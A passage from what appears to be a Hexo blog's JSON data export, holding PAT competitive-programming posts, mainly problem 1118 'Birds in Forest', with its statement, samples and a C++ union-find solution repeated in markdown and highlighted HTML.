class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> k;</div><div class=\"line\"><span class=\"keyword\">int</span> cou = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> sta = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">char</span> pre;</div><div class=\"line\"><span class=\"built_in\">string</span> mes;</div><div class=\"line\"><span class=\"built_in\">string</span> ans = <span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"built_in\">string</span> wrong = <span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"built_in\">map</span>&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt; m;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;k);</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; mes;</div><div class=\"line\">\tmes += <span class=\"string\">'#'</span>;</div><div class=\"line\">\tm.insert(pair&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt;(<span class=\"string\">'_'</span>, <span class=\"number\">-1</span>));</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">char</span> i = <span class=\"string\">'a'</span>; i &lt;= <span class=\"string\">'z'</span>; i++)</div><div class=\"line\">\t\tm.insert(pair&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt;(i, <span class=\"number\">-1</span>));</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">char</span> i = <span class=\"string\">'0'</span>; i &lt;= <span class=\"string\">'9'</span>; i++)</div><div class=\"line\">\t\tm.insert(pair&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt;(i, <span class=\"number\">-1</span>));</div><div class=\"line\">\tpre = mes[<span class=\"number\">0</span>];</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; mes.length(); i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (pre == mes[i])</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tsta = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\tcou++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tsta = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (cou % k == <span class=\"number\">0</span> &amp;&amp; m[pre] == <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tm[pre] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\t\twrong += pre;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (cou % k != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tm[pre] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tpre = mes[i];</div><div class=\"line\">\t\t\tcou = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; wrong.size(); i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (m[wrong[i]] == <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; wrong[i];</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; mes.size() - <span class=\"number\">1</span>;)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (m[mes[i]])</div><div class=\"line\">\t\t&#123; <span class=\"built_in\">cout</span> &lt;&lt; mes[i]; i++; &#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123; <span class=\"built_in\">cout</span> &lt;&lt; mes[i]; i += k; &#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1118","date":"2017-02-19T02:37:08.000Z","_content":"\n## Description\n\n> 1118.Birds in Forest\n\n> Some scientists took pictures of thousands of birds in a forest. Assume that all the birds appear in the same picture belong to the same tree. You are supposed to help the scientists to count the maximum number of trees in the forest, and for any pair of birds, tell if they are on the same tree.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive number N (<= 104) which is the number of pictures. Then N lines follow, each describes a picture in the format:\nK B1 B2 ... BK\nwhere K is the number of birds in this picture, and Bi's are the indices of birds. It is guaranteed that the birds in all the pictures are numbered continuously from 1 to some number that is no more than 104.\n\n> After the pictures there is a positive number Q (<= 104) which is the number of queries. Then Q lines follow, each contains the indices of two birds.\n\n> Output Specification:\n\n> For each test case, first output in a line the maximum possible number of trees and the number of birds. Then for each query, print in a line \"Yes\" if the two birds belong to the same tree, or \"No\" if not.\n\n> Sample Input:\n4\n3 10 1 2\n2 3 4\n4 1 5 7 8\n3 9 6 4\n2\n10 5\n3 7\n\n> Sample Output:\n2 10\nYes\nNo\n\n\n查并集问题，知道了就好做了。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e4 + 10;\nconst int maxQ = 1e4 + 10;\n\nint n, q;\nint x, y, z;\nint a, b;\nint pre[maxN + 1];\nint fa[maxN + 1];\nbool e[maxN + 1];\nint bn, tn;\n\nint find(int x)\n{\n\tint r = x;\n\twhile (pre[r] != r)\n\t\tr = pre[r];\n\tint i = x, j;\n\twhile (i != r)\n\t{\n\t\tj = pre[i];\n\t\tpre[i] = r;\n\t\ti = j;\n\t}\n\treturn r;\n}\n\nvoid join(int x, int y)\n{\n\tint fx = find(x), fy = find(y);\n\tif (fx != fy)\n\t\tpre[fy] = fx;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tfor (int i = 1; i <= maxN; i++)\n\t\tpre[i] = i;\n\twhile (n--)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tscanf(\"%d\", &y);\n\t\te[y] = true;\n\t\tfor (int i = 0; i < x - 1; i++)\n\t\t{\n\t\t\tscanf(\"%d\", &z);\n\t\t\te[z] = true;\n\t\t\tif (z != find(z))\n\t\t\t{\n\t\t\t\tjoin(y, z);\n\t\t\t\tfa[z] = find(y);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tjoin(z, y);\n\t\t\t\tfa[y] = find(z);\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 1; i <= maxN + 1; i++)\n\t\tif (e[i])\n\t\t{\n\t\t\tbn++;\n\t\t\tif (pre[i] == i)tn++;\n\t\t}\n\tprintf(\"%d %d\\n\", tn, bn);\n\tscanf(\"%d\", &q);\n\twhile (q--)\n\t{\n\t\tscanf(\"%d%d\", &a, &b);\n\t\t(find(a) == find(b)) ? printf(\"Yes\\n\") : printf(\"No\\n\");\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1118.md","raw":"---\ntitle: PAT advanced 1118\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-19 10:37:08\n---\n\n## Description\n\n> 1118.Birds in Forest\n\n> Some scientists took pictures of thousands of birds in a forest. Assume that all the birds appear in the same picture belong to the same tree. You are supposed to help the scientists to count the maximum number of trees in the forest, and for any pair of birds, tell if they are on the same tree.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive number N (<= 104) which is the number of pictures. Then N lines follow, each describes a picture in the format:\nK B1 B2 ... BK\nwhere K is the number of birds in this picture, and Bi's are the indices of birds. It is guaranteed that the birds in all the pictures are numbered continuously from 1 to some number that is no more than 104.\n\n> After the pictures there is a positive number Q (<= 104) which is the number of queries. Then Q lines follow, each contains the indices of two birds.\n\n> Output Specification:\n\n> For each test case, first output in a line the maximum possible number of trees and the number of birds. Then for each query, print in a line \"Yes\" if the two birds belong to the same tree, or \"No\" if not.\n\n> Sample Input:\n4\n3 10 1 2\n2 3 4\n4 1 5 7 8\n3 9 6 4\n2\n10 5\n3 7\n\n> Sample Output:\n2 10\nYes\nNo\n\n\n查并集问题，知道了就好做了。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e4 + 10;\nconst int maxQ = 1e4 + 10;\n\nint n, q;\nint x, y, z;\nint a, b;\nint pre[maxN + 1];\nint fa[maxN + 1];\nbool e[maxN + 1];\nint bn, tn;\n\nint find(int x)\n{\n\tint r = x;\n\twhile (pre[r] != r)\n\t\tr = pre[r];\n\tint i = x, j;\n\twhile (i != r)\n\t{\n\t\tj = pre[i];\n\t\tpre[i] = r;\n\t\ti = j;\n\t}\n\treturn r;\n}\n\nvoid join(int x, int y)\n{\n\tint fx = find(x), fy = find(y);\n\tif (fx != fy)\n\t\tpre[fy] = fx;\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tfor (int i = 1; i <= maxN; i++)\n\t\tpre[i] = i;\n\twhile (n--)\n\t{\n\t\tscanf(\"%d\", &x);\n\t\tscanf(\"%d\", &y);\n\t\te[y] = true;\n\t\tfor (int i = 0; i < x - 1; i++)\n\t\t{\n\t\t\tscanf(\"%d\", &z);\n\t\t\te[z] = true;\n\t\t\tif (z != find(z))\n\t\t\t{\n\t\t\t\tjoin(y, z);\n\t\t\t\tfa[z] = find(y);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tjoin(z, y);\n\t\t\t\tfa[y] = find(z);\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 1; i <= maxN + 1; i++)\n\t\tif (e[i])\n\t\t{\n\t\t\tbn++;\n\t\t\tif (pre[i] == i)tn++;\n\t\t}\n\tprintf(\"%d %d\\n\", tn, bn);\n\tscanf(\"%d\", &q);\n\twhile (q--)\n\t{\n\t\tscanf(\"%d%d\", &a, &b);\n\t\t(find(a) == find(b)) ? printf(\"Yes\\n\") : printf(\"No\\n\");\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1118","published":1,"updated":"2017-02-19T02:40:31.281Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k14002zhv185vo77z77","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1118.Birds in Forest</p>\n<p>Some scientists took pictures of thousands of birds in a forest. Assume that all the birds appear in the same picture belong to the same tree. You are supposed to help the scientists to count the maximum number of trees in the forest, and for any pair of birds, tell if they are on the same tree.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive number N (&lt;= 104) which is the number of pictures. Then N lines follow, each describes a picture in the format:<br>K B1 B2 … BK<br>where K is the number of birds in this picture, and Bi’s are the indices of birds. It is guaranteed that the birds in all the pictures are numbered continuously from 1 to some number that is no more than 104.</p>\n<p>After the pictures there is a positive number Q (&lt;= 104) which is the number of queries. Then Q lines follow, each contains the indices of two birds.</p>\n<p>Output Specification:</p>\n<p>For each test case, first output in a line the maximum possible number of trees and the number of birds. Then for each query, print in a line “Yes” if the two birds belong to the same tree, or “No” if not.</p>\n<p>Sample Input:<br>4<br>3 10 1 2<br>2 3 4<br>4 1 5 7 8<br>3 9 6 4<br>2<br>10 5<br>3 7</p>\n<p>Sample Output:<br>2 10<br>Yes<br>No</p>\n</blockquote>\n<p>查并集问题，知道了就好做了。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxQ = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, q;</div><div class=\"line\"><span class=\"keyword\">int</span> x, y, z;</div><div class=\"line\"><span class=\"keyword\">int</span> a, b;</div><div class=\"line\"><span class=\"keyword\">int</span> pre[maxN + <span class=\"number\">1</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> fa[maxN + <span class=\"number\">1</span>];</div><div class=\"line\"><span class=\"keyword\">bool</span> e[maxN + <span class=\"number\">1</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> bn, tn;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> r = x;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (pre[r] != r)</div><div class=\"line\">\t\tr = pre[r];</div><div class=\"line\">\t<span class=\"keyword\">int</span> i = x, j;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i != r)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tj = pre[i];</div><div class=\"line\">\t\tpre[i] = r;</div><div class=\"line\">\t\ti = j;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> r;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">join</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> fx = find(x), fy = find(y);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (fx != fy)</div><div class=\"line\">\t\tpre[fy] = fx;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= maxN; i++)</div><div class=\"line\">\t\tpre[i] = i;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\te[y] = <span class=\"literal\">true</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; x - <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;z);</div><div class=\"line\">\t\t\te[z] = <span class=\"literal\">true</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (z != find(z))</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tjoin(y, z);</div><div class=\"line\">\t\t\t\tfa[z] = find(y);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tjoin(z, y);</div><div class=\"line\">\t\t\t\tfa[y] = find(z);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= maxN + <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (e[i])</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tbn++;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pre[i] == i)tn++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>, tn, bn);</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;q);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (q--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;a, &amp;b);</div><div class=\"line\">\t\t(find(a) == find(b)) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"Yes\\n\"</span>) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"No\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1118.Birds in Forest</p>\n<p>Some scientists took pictures of thousands of birds in a forest. Assume that all the birds appear in the same picture belong to the same tree. You are supposed to help the scientists to count the maximum number of trees in the forest, and for any pair of birds, tell if they are on the same tree.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive number N (&lt;= 104) which is the number of pictures. Then N lines follow, each describes a picture in the format:<br>K B1 B2 … BK<br>where K is the number of birds in this picture, and Bi’s are the indices of birds. It is guaranteed that the birds in all the pictures are numbered continuously from 1 to some number that is no more than 104.</p>\n<p>After the pictures there is a positive number Q (&lt;= 104) which is the number of queries. Then Q lines follow, each contains the indices of two birds.</p>\n<p>Output Specification:</p>\n<p>For each test case, first output in a line the maximum possible number of trees and the number of birds. Then for each query, print in a line “Yes” if the two birds belong to the same tree, or “No” if not.</p>\n<p>Sample Input:<br>4<br>3 10 1 2<br>2 3 4<br>4 1 5 7 8<br>3 9 6 4<br>2<br>10 5<br>3 7</p>\n<p>Sample Output:<br>2 10<br>Yes<br>No</p>\n</blockquote>\n<p>查并集问题，知道了就好做了。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxQ = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, q;</div><div class=\"line\"><span class=\"keyword\">int</span> x, y, z;</div><div class=\"line\"><span class=\"keyword\">int</span> a, b;</div><div class=\"line\"><span class=\"keyword\">int</span> pre[maxN + <span class=\"number\">1</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> fa[maxN + <span class=\"number\">1</span>];</div><div class=\"line\"><span class=\"keyword\">bool</span> e[maxN + <span class=\"number\">1</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> bn, tn;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> r = x;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (pre[r] != r)</div><div class=\"line\">\t\tr = pre[r];</div><div class=\"line\">\t<span class=\"keyword\">int</span> i = x, j;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i != r)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tj = pre[i];</div><div class=\"line\">\t\tpre[i] = r;</div><div class=\"line\">\t\ti = j;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> r;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">join</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> fx = find(x), fy = find(y);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (fx != fy)</div><div class=\"line\">\t\tpre[fy] = fx;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= maxN; i++)</div><div class=\"line\">\t\tpre[i] = i;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\te[y] = <span class=\"literal\">true</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; x - <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;z);</div><div class=\"line\">\t\t\te[z] = <span 